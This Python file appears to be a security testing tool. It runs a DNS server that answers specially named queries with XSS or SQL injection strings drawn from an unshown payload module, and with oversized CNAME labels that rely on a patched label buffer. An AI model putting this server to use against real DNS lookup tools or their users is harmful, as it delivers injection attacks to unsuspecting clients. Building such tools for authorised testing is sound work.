import dnslib.server
import dnslib
import payloads
import random

import hackedLabel


# install hacks 

dnslib.dns.DNSBuffer = hackedLabel.HackedLabelBuffer # overcome 64bytes limit ins req && repsp



logger = None

LISTEN_ADDR = "0.0.0.0"
LISTEN_PORT = 15353

FRENDLY_TLD = ".fake.in.0xe.ee"

DEFAULT_TTL = 1

def _ret(a,b):
  return dict(rtype=a, data=b)

def _common_handle_payload_list(ptr_list, rt, idx):
  if idx == 'a':
    return [ _ret(rt, x.strip()) for x in ptr_list]
  if idx == 'r':
    idx = random.randint(0,len(ptr_list)-1)
  else:
    idx = int(idx) % len(ptr_list)
  return [ _ret(rt, ptr_list[idx].strip()) ]

class TheQueryResponsePair(object):
  def __init__(self, req, rsp):
    self._req = req
    self._rsp = rsp
    self._qname = str(req.q.qname)

  def _fast_add_ans(self, rt, rd):
    self._rsp.add_answer(
      dnslib.RR(
        rname=self._qname, 
        ttl=DEFAULT_TTL,
        rclass=self._req.q.qclass, 
        rtype=rt, 
        rdata=rd
      )
    )

  def evaluate(self):
    parts = self._qname.split(".")
    for part in parts:
      opt = part
      arg = []
      if "-" in part:
        _tmp = part.split("-")
        opt = _tmp[0]
        arg = _tmp[1:]
      #print(opt + "(" + str(arg) + ")")
      _func_ptr = getattr(self, "_handle_opt_{0}".format(opt), None)
      if _func_ptr is None:
        continue
      result = _func_ptr(*arg)
      for entry in result:
        upper_rt = entry['rtype'].upper()
        rt_val = getattr(dnslib.QTYPE, upper_rt)
        rd_class = getattr(dnslib, upper_rt)
        self._fast_add_ans(rt_val, rd_class(entry['data']))

  def _handle_opt_ll(self, size=100):
    size = int(size)
    return [ _ret("CNAME", "x" * size + FRENDLY_TLD)  ]
    
  def _handle_opt_xss(self, rt='txt', idx = 'r'):
    return _common_handle_payload_list(payloads.xss, rt, idx)

  def _handle_opt_sqli(self, rt='txt', idx = 'r'):
    return _common_handle_payload_list(payloads.sqli, rt, idx)  



class MyResolver(dnslib.server.BaseResolver):
  def resolve(self, req, handler):
    reply = req.reply()
    try:
      obj = TheQueryResponsePair(req, reply)
      obj.evaluate()
    except Exception as ex:   
      reply.add_ar(
        dnslib.RR(
          rname = '' + str(ex.__class__.__name__) + ".exception",
          rclass = dnslib.CLASS.IN,
          rtype = dnslib.QTYPE.TXT,
          ttl=10,
          rdata=dnslib.TXT(str(ex))
        )
      )

    return reply



def main():
  print("Will listen on {} : {} ".format(LISTEN_ADDR, LISTEN_PORT))
  resolver = MyResolver()
  logger = dnslib.server.DNSLogger(prefix=False)
  server = dnslib.server.DNSServer(resolver, port=LISTEN_PORT, address=LISTEN_ADDR, logger=logger)
  server.start()


if __name__ == "__main__":
  main()
else:
  print "This is MAIN module, you should run it !"
